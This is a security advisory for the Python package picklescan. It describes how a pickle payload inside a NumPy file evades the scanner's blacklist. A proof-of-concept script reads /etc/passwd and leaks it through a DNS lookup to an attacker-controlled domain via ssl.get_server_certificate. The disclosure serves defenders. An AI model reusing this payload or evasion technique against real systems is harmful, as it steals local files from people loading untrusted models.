# [H] Picklescan Vulnerable to Exfiltration via DNS via linecache and ssl.get_server_certificate

## Summary
Severity: High
Advisory: GHSA-93mv-x874-956g
CVE: CVE-2025-46417
CWE: CWE-184
Ecosystem: PyPI
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2025-04-07
Source: https://github.com/advisories/GHSA-93mv-x874-956g
Type: github-advisory

## Affected
- PyPI: `picklescan` — affected >=0 <0.0.25

## Details
### Summary

Picklescan does not detect malicious pickles that exfiltrate sensitive information via DNS after deserialization.


### Details

picklescan’s blacklist can be bypassed to exfiltrate sensitive information (like file contents, secrets, or credentials) during model deserialization by leveraging `ssl.get_server_certificate` as the callable function in the pickle payload. Since `ssl` is a standard Python library used for legitimate TLS operations, it is rarely blacklisted by static scanners or runtime monitors.

The payload avoids flagged modules and instead uses `linecache` (also unflagged) to read local files. The exfiltrated data is added to DNS-safe chunks, and embedded as subdomains in a crafted FQDN.  When passed to `ssl.get_server_certificate`, the Python runtime performs a DNS resolution to the attacker-controlled domain, leaking the encoded content.

The payload executes the following steps:

- Reads sensitive local file content using `linecache` module
- Encodes the data for DNS exfiltration
- Constructs a malicious domain name using a third party service `dnslog.cn` 
- Triggers a DNS resolution via `ssl.get_server_certificate`
- Leaks the encoded file content to the attacker

### PoC

Before running the PoC change the `fqdn` to your own or a third party that you control. In this PoC we used ` fqdn = f"{subdomain}.ctmc2q.dnslog.cn"`.

```python

import numpy as np

def create_malicious_model():
# Define the payload class
    class DNSLogPayload:
        def __reduce__(self):
            # Step 1: read a line from /etc/passwd
            linecache = __import__("linecache")
            first_line = linecache.getline("/etc/passwd", 1).strip()

            # Step 2: Sanitize and embed it as a DNS subdomain
            subdomain = first_line.replace(":", "_").replace("/", "_")
            fqdn = f"{subdomain}.dns-logger.invalid"

            # Step 3: Use ssl.get_server_certificate to trigger DNS resolution
            ssl_mod = __import__("ssl")
            return (getattr(ssl_mod, "get_server_certificate"), ((fqdn, 443),))

    # Wrap the payload in a NumPy object array
    arr = np.array([DNSLogPayload()], dtype=object)

    # Save to .npy file
    np.save("dnslog_trigger_payload.npy", arr, allow_pickle=True)   

def load_model(model):
    try:
        return np.load(model, encoding="latin1", fix_imports=True, allow_pickle=1)
    except Exception:
        raise ValueError("Invalid file")

if __name__ == "__main__":
    create_malicious_model()
    model = "dnslog_trigger_payload.npy"
    print("[i] Loading and executing the model")
    data = load_model(model)
 
```

### Impact

1. Evade detection: Bypasses the latest version of picklescan's blacklist. 
2. Exfiltrate sensitive local files to an attacker controlled DNS

## References
- https://github.com/mmaitre314/picklescan/security/advisories/GHSA-93mv-x874-956g
- https://nvd.nist.gov/vuln/detail/CVE-2025-46417
- https://github.com/mmaitre314/picklescan/pull/40
- https://github.com/mmaitre314/picklescan
- https://github.com/pypa/advisory-database/tree/main/vulns/picklescan/PYSEC-2025-34.yaml
